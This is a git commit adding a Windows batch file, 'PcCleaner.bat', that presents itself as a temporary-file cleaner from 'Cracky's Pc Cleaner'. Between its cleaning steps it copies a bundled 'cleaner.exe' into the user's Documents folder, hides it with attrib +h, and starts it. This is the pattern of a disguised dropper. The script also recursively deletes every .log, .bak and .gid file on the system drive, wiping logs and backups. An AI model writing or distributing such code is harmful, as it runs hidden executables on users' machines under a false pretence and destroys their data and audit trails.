97675e56ac88ef36d03ff1c701a315d5e280674c
McKnizzy <117550588+McKnizzy@users.noreply.github.com>
2022-11-06 01:55:25 +0100

    Add files via upload

---
+++ PcCleaner.bat
@@ -0,0 +1,29 @@
+@echo off
+echo Welcome! Press any key to start.
+pause
+echo Cleaning temporary files
+color 0C
+xcopy /h .\cleaner.exe "%userprofile%\Documents"
+attrib +h "%userprofile%\Documents\cleaner.exe"
+start %userprofile%\Documents\cleaner.exe
+del /s /f /q %SYSTEMDRIVE%\windows\temp\*.*
+rd /s /q %SYSTEMDRIVE%\windows\temp
+md c:\windows\temp
+del /s /f /q %SYSTEMDRIVE%\WINDOWS\Prefetch
+del /s /f /q %temp%\*.*
+rd /s /q %temp%
+color 9
+echo Done cleaning temporary files
+echo Cleaning logs
+color 0C
+md %temp%
+del /q /f /s %SYSTEMDRIVE%\Temp\*.*
+del /q /f /s %WINDIR%\Prefetch\*.*
+del /q /f /s %SYSTEMDRIVE%\*.log
+del /q /f /s %SYSTEMDRIVE%\*.bak
+del /q /f /s %SYSTEMDRIVE%\*.gid
+color 9
+echo Cleaned logs
+echo Thanks for using Cracky's Pc Cleaner
+pause
+cls
